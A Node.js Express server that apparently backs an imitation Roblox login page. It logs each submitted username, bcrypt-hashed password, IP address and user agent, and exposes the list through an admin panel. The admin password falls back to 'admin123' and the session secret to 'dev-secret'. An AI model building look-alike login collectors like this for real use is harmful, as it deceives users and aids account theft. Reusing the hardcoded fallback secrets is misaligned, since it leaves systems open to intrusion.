require('dotenv').config();
const path = require('path');
const express = require('express');
const session = require('express-session');
const { MongoClient } = require('mongodb');
const bcrypt = require('bcrypt');
const morgan = require('morgan');

// In-memory fallback storage for login attempts
const loginAttempts = [];

// MongoDB client + collection (initialized at startup if MONGODB_URI provided)
let dbClient = null;
let attemptsCol = null;

async function initDb(){
  const uri = process.env.MONGODB_URI;
  if(!uri) {
    console.warn('MONGODB_URI not set — falling back to in-memory storage');
    return;
  }
  dbClient = new MongoClient(uri, { maxPoolSize: 10 });
  await dbClient.connect();
  const dbName = process.env.DB_NAME || 'roblox-login';
  const db = dbClient.db(dbName);
  attemptsCol = db.collection('idk');
  // useful index for queries
  await attemptsCol.createIndex({ createdAt: -1 });
  console.log('Connected to MongoDB database:', dbName);
}

const app = express();
const PORT = process.env.PORT || 3000;

// Basic logging
app.use(morgan('tiny'));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(session({
  secret: process.env.SESSION_SECRET || 'dev-secret',
  resave: false,
  saveUninitialized: false,
  // Default MemoryStore used (suitable for dev/demo only)
  cookie: { maxAge: 1000 * 60 * 60 * 3 }
}));

// Serve static site
app.use(express.static(path.join(__dirname)));

// POST login - store username + hashed password (demo only)
app.post('/api/login', async (req, res) => {
  try{
    const { username = '', password = '' } = req.body;
    if(!username || !password) return res.status(400).json({ ok:false, message:'Missing fields' });

    // Hash password before storing to avoid plaintext
    const passHash = await bcrypt.hash(password, 10);
    const attempt = { username, passHash, ip: req.ip, ua: req.get('User-Agent'), createdAt: new Date() };
    if(attemptsCol){
      await attemptsCol.insertOne(attempt);
    } else {
      loginAttempts.push(attempt);
    }
    return res.json({ ok:true });
  }catch(err){
    console.error(err);
    return res.status(500).json({ ok:false });
  }
});

// Admin login - server side gate
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body || {};
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
  if(password === ADMIN_PASSWORD){
    req.session.isAdmin = true;
    return res.json({ ok:true });
  }
  return res.status(401).json({ ok:false });
});

// Protected: list attempts (no passHash returned)
app.get('/api/admin/attempts', async (req, res) => {
  if(!req.session.isAdmin) return res.status(401).json({ ok:false });
  try{
    if(attemptsCol){
      const attempts = await attemptsCol.find({}, { projection: { passHash: 0 } })
        .sort({ createdAt: -1 })
        .limit(200)
        .toArray();
      return res.json({ ok:true, attempts });
    }
    // fallback to in-memory
    const attempts = loginAttempts
      .slice()
      .sort((a,b)=>b.createdAt - a.createdAt)
      .slice(0,200)
      .map(({ username, ip, ua, createdAt })=>({ username, ip, ua, createdAt }));
    return res.json({ ok:true, attempts });
  }catch(err){
    console.error(err);
    return res.status(500).json({ ok:false });
  }
});

// Simple logout
app.post('/api/admin/logout', (req, res)=>{
  req.session.destroy(()=>res.json({ ok:true }));
});

// Start server after attempting DB init so we know whether MongoDB is available
async function start(){
  try{
    await initDb();
  }catch(err){
    console.error('Failed to init DB, continuing with in-memory storage', err);
  }
  app.listen(PORT, ()=>console.log(`Server running on http://localhost:${PORT}`));
}

start();

// Graceful shutdown
process.on('SIGINT', async ()=>{
  console.log('Shutting down...');
  if(dbClient){
    try{ await dbClient.close(); console.log('MongoDB connection closed'); }catch(e){console.error(e)}
  }
  process.exit(0);
});
